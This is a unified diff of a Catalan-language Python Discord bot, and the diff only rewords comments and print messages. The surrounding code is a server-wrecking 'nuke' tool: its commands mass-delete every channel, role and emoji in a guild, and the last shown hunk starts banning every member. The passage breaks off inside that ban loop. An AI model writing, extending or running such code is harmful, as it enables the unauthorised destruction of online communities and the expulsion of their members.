@@ -6,7 +6,7 @@ prefix = "~" # Això s'utilitzarà al començament de les ordres.
 
 import discord
 from discord.ext import commands
-# Importa les llibreries necessàries.
+# Importa les biblioteques necessàries.
 
 print ("Espereu..")
 
@@ -96,7 +96,7 @@ try:
                     await role.delete()
                     print (f"{role.name} ha estat esborrat de {ctx.guild.name}")
                 except:
-                    print (f"{role.name} NO s'ha pogut esborrar de {ctx.guild.name}")
+                    print (f"{role.name} NO he pogut esborrar de {ctx.guild.name}")
             print ("Acció completada: dall roles")
         elif condition.lower() == "emojis":
             for emoji in list(ctx.guild.emojis):
@@ -104,7 +104,7 @@ try:
                     await emoji.delete()
                     print (f"{emoji.name} ha estat esborrat de {ctx.guild.name}")
                 except:
-                    print (f"{emoji.name} NO s'ha pogut esborrar de {ctx.guild.name}")
+                    print (f"{emoji.name} NO he pogut esborrar de {ctx.guild.name}")
             print ("Acció completada: dall emojis")
         elif condition.lower() == "all":
             for channel in list(ctx.guild.channels):
@@ -112,19 +112,19 @@ try:
                     await channel.delete()
                     print (f"{channel.name} ha estat esborrat de {ctx.guild.name}")
                 except:
-                    print (f"{channel.name} NO s'ha pogut esborrar de {ctx.guild.name}")
+                    print (f"{channel.name} NO he pogut esborrar de {ctx.guild.name}")
             for role in list(ctx.guild.roles):
                 try:
                     await role.delete()
                     print (f"{role.name} ha estat esborrat de {ctx.guild.name}")
                 except:
-                    print (f"{role.name} NO s'ha pogut esborrar de {ctx.guild.name}")
+                    print (f"{role.name} NO he pogut esborrar de {ctx.guild.name}")
             for emoji in list(ctx.guild.emojis):
                 try:
                     await emoji.delete()
                     print (f"{emoji.name} ha estat esborrat de {ctx.guild.name}")
                 except:
-                    print (f"{emoji.name} NO s'ha pogut esborrar de {ctx.guild.name}")
+                    print (f"{emoji.name} NO he pogut esborrar de {ctx.guild.name}")
             print ("Acció completada: dall all")
     # Pot fer múltiples accions de esborrar massivament.
 
@@ -137,19 +137,19 @@ try:
                 await emoji.delete()
                 print (f"{emoji.name} ha estat esborrat de {ctx.guild.name}")
             except:
-                print (f"{emoji.name} NO s'ha pogut esborrar de {ctx.guild.name}")
+                print (f"{emoji.name} NO he pogut esborrar de {ctx.guild.name}")
         for channel in list(ctx.guild.channels):
             try:
                 await channel.delete()
                 print (f"{channel.name} ha estat esborrat de {ctx.guild.name}")
             except:
-                print (f"{channel.name} NO s'ha pogut esborrar de {ctx.guild.name}")
+                print (f"{channel.name} NO he pogut esborrar de {ctx.guild.name}")
         for role in list(ctx.guild.roles):
             try:
                 await role.delete()
                 print (f"{role.name} ha estat esborrat de {ctx.guild.name}")
             except:
-                print (f"{role.name} NO s'ha pogut esborrar de {ctx.guild.name}")
+                print (f"{role.name} NO he pogut esborrar de {ctx.guild.name}")
         for user in list(ctx.guild.members):
             try:
                 await ctx.guild.ban(user)
